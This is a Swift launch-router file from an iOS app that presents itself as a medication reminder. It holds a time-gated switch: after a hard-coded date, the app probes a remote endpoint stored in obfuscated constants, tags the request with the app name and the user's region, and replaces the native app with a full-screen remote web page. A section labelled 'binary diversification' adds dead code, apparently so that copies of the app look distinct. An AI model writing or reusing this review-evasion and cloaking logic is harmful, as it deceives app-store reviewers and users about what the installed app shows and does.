//
//  AppRouter.swift
//  146MedRemind
//

import UIKit
import SwiftUI

final class MedLaunchCoordinator {

    private var seedEndpointLiteral: String { MedRouteCipher.Launch.seedEndpoint }
    private var scheduleThresholdLiteral: String { MedRouteCipher.Launch.scheduleThreshold }

    private var applicationDisplayName: String {
        if let name = Bundle.main.object(forInfoDictionaryKey: MedRouteCipher.BundleMeta.displayName) as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        if let name = Bundle.main.object(forInfoDictionaryKey: MedRouteCipher.BundleMeta.shortName) as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        return MedRouteCipher.BundleMeta.fallbackTitle
    }

    private var applicationNameForSubId: String {
        applicationDisplayName.replacingOccurrences(of: " ", with: "")
    }

    private var enrichedSeedEndpoint: String {
        let geo = Locale.current.region?.identifier ?? MedRouteCipher.BundleMeta.unknownRegion
        let subValue = "\(applicationNameForSubId)_\(geo)"
        guard var components = URLComponents(string: seedEndpointLiteral) else {
            return seedEndpointLiteral
        }
        var items = components.queryItems ?? []
        items.append(URLQueryItem(name: MedRouteCipher.Launch.trackingQueryName, value: subValue))
        components.queryItems = items
        return components.url?.absoluteString ?? seedEndpointLiteral
    }

    func rootViewControllerForLaunch() -> UIViewController {
        let session = MedRouteSessionStore.shared

        if session.nativeShellPresentedFlag {
            return assembleNativeShell()
        } else {
            if isPastSchedulingGate() {
                if let savedUrlString = session.persistedDestinationRaw,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return assembleBrowserHost(with: savedUrlString)
                }

                return assembleSplashGate()
            } else {
                session.nativeShellPresentedFlag = true
                return assembleNativeShell()
            }
        }
    }

    private func isPastSchedulingGate() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = MedRouteCipher.Launch.scheduleFormat
        let targetDate = dateFormatter.date(from: scheduleThresholdLiteral) ?? Date()
        let currentDate = Date()

        if currentDate < targetDate {
            return false
        } else {
            return true
        }
    }

    private func assembleBrowserHost(with urlString: String) -> UIViewController {
        let webViewContainer = MedEmbeddedBrowserScreen(
            urlString: urlString,
            onFailure: { [weak self] in
                MedRouteSessionStore.shared.nativeShellPresentedFlag = true
                self?.transitionNativeShell()
            },
            onSuccess: {
                MedRouteSessionStore.shared.remoteDocumentReadyFlag = true
            }
        )

        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func assembleNativeShell() -> UIViewController {
        MedRouteSessionStore.shared.nativeShellPresentedFlag = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func assembleSplashGate() -> UIViewController {
        let launchView = MedBootstrapSplashView()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        performRemoteGateProbe { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.transitionBrowserShell(with: url)
                } else {
                    MedRouteSessionStore.shared.nativeShellPresentedFlag = true
                    self?.transitionNativeShell()
                }
            }
        }

        return launchVC
    }

    private func performRemoteGateProbe(completion: @escaping (Bool, String?) -> Void) {
        let urlToOpenInWebView = enrichedSeedEndpoint
        guard let requestURL = URL(string: urlToOpenInWebView) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: requestURL)
        request.httpMethod = MedRouteCipher.Launch.probeVerb
        request.timeoutInterval = 25

        URLSession.shared.dataTask(with: request) { _, response, error in
            if error != nil {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let code = httpResponse.statusCode
                let isAvailable = (200...299).contains(code)
                completion(isAvailable, isAvailable ? urlToOpenInWebView : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }

    private func transitionNativeShell() {
        let contentVC = assembleNativeShell()
        applyRootTransition(contentVC)
    }

    private func transitionBrowserShell(with urlString: String) {
        let webVC = assembleBrowserHost(with: urlString)
        applyRootTransition(webVC)
    }

    private func applyRootTransition(_ viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }

    // MARK: - Unused surface (binary diversification)

    private func unusedRouteFingerprint() -> Int {
        MedRoutePhase.probing.rawValue ^ Int(scheduleThresholdLiteral.count)
    }
}
